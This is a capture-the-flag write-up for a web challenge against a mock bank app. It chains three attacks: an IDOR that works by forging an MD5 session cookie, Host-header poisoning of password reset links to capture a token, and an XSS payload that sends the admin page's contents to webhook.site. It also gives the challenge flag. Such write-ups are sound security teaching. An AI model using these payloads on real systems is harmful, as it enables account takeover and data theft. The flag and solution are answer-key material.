## SecureMFB


**Category:** Web  
**Difficulty:** Hard

## Description
SecureMFB Bank has asked you to assess their server for potential security flaws that could impact customer safety and experience. Your task is to identify and exploit any vulnerability you find.

## Write-Up
This challenge focuses on a chain of vulnerabilities. It starts with an IDOR that allows account takeover, followed by a Host Header Injection vulnerability abused to manipulate the password reset flow. Finally, a Cross‑Site Scripting (XSS) flaw is used to exfiltrate content of admin page.

Visiting the webpage is just a bank‑looking web application with options to create an account or log in. After registering a new account and logging in, the application exposes minimal functionality, a profile page, a logout option, and a dashboard showing a $0 account balance.

With no obvious attack vectors available, attention shifts to the session cookie, which is an MD5 hash. Decoding this value reveals the numeric user ID associated with the logged‑in account.

New user registrations are assigned a numeric user ID that is stored in the session cookie as an MD5 hash. Because three accounts already exist on the server, newly registered users start from user ID 4.

The first three accounts belong to privileged users: admin, department officer, and intern. Attempting to generate MD5 hashes for user IDs 1 or 2 results in an unauthorized response, which acts as a red herring. These accounts use a different session mechanism and are not tied to the MD5‑based cookie so player can use the intended way.

As a result, valid session manipulation only works for user IDs 3 and above, allowing players to identify and abuse the IDOR vulnerability.

## Exploitation
The goals now is to access the intern account first by generating a MD5 hash of `3` and replace the server cookie session hash to our newly generated hash which will give full access to the intern account.
```bash
└─$ echo -n 3 | md5sum
eccbc87e4b5ce2fe28308fd9f2a7baf3  -
```

<img width="1415" height="553" alt="image" src="https://github.com/user-attachments/assets/d3007c02-f6c4-4f93-b5e8-5e386ac4fa8d" />

Things to notice that the intern dashboard is different from customer dashboard because there is `Inbox` by the left side of the navbar and a balance worth `$1000`. Checking out the `Inbox` should be an email from the department giving a warning to the intern about a password reset, that should give a clue that the next step should be a password reset by reseting the password of the sender password.

<img width="1389" height="609" alt="image" src="https://github.com/user-attachments/assets/0553c828-3b8e-463e-8774-8492a18a6502" />

Proceeding to the Forgot Password page and requesting a password reset for user `edward` by providing his email. The application returns a generic confirmation indicating that a reset link has been sent if the email exists.

So how do we obtain the password reset link? This is where Host Header Injection comes into play. By manipulating the Host header and forwarding it to our oen controlled domain, in my case I use interactsh, the application generates a password reset link pointing to our server instead.

When the victim clicks the link, the reset token is sent to our controlled domain, allowing password reset for user `edward`. 
```bash
Request
POST /forgot-password HTTP/1.1
Host: 10.0.0.210:3000
X-Forwarded-Host: <your-controlled-domain>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://10.0.0.210:3000
Connection: keep-alive
Referer: http://10.0.0.210:3000/forgot-password
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=edward.department@securemfb.org
```

<img width="1069" height="597" alt="image" src="https://github.com/user-attachments/assets/1be910c5-0c06-4535-80b3-e4a98d8b60e6" />
<img width="1397" height="603" alt="image" src="https://github.com/user-attachments/assets/3f7d9e40-8880-415d-88e7-6bb41c424321" />

With a valid reset token (10‑minute expiry), we can complete the reset by visiting the /reset endpoint on the main domain with the captured token.

<img width="1295" height="617" alt="image" src="https://github.com/user-attachments/assets/7db372d8-bbb0-42a9-a941-432396f0faf8" />

Using the newly set password, we log in as Edward and observe a $5000 account balance. Unlike regular users, Edward’s dashboard exposes additional functionality, including Send Report, Profile, and Admin.

Attempting to access the Admin page redirects to `localhost:5000/admin`, making it inaccessible externally. However, the Send Report feature indicates that we can send a report to the admin.

<img width="1371" height="609" alt="image" src="https://github.com/user-attachments/assets/721b097a-1eb5-4514-9e67-93d9b74c6e5f" />

This creates the final attack vector, injecting XSS into the report content and waiting for the admin to visit the page, allowing us to exfiltrate the contents of the admin page.

<img width="1849" height="773" alt="image" src="https://github.com/user-attachments/assets/10dad3d0-ab4a-4eae-8074-113353ecfb53" />

XSS payload use to exfiltrate admin content page
```
<script>
new Image().src="https://webhook.site/TOKEN?c="
  + encodeURIComponent(document.body.innerHTML)
</script>
```
Then checking webhook, we should be able to see the admin page content.
<img width="1398" height="609" alt="image" src="https://github.com/user-attachments/assets/1b3b76f4-83d0-4f9e-aee8-14e475008870" />

## Flag
flag{0fba2399df52d7ccd112a3555bffc4c9}

